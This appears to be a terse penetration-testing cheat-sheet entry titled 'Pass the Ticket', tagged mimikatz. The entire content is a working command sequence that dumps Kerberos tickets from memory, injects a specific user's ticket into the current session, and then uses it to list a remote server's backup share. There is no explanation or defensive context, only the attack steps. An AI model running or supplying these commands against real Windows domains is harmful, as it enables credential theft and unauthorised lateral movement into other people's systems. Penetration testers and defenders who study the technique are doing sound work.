# PASS THE TICKET
#mimikatz 
```
privilege::debug
sekurlsa::tickets /export
kerberos::ptt [0;12bd0]-0-0-40810000-joe@cifs-server.kirbi

klist
ls \\[server]\backup
```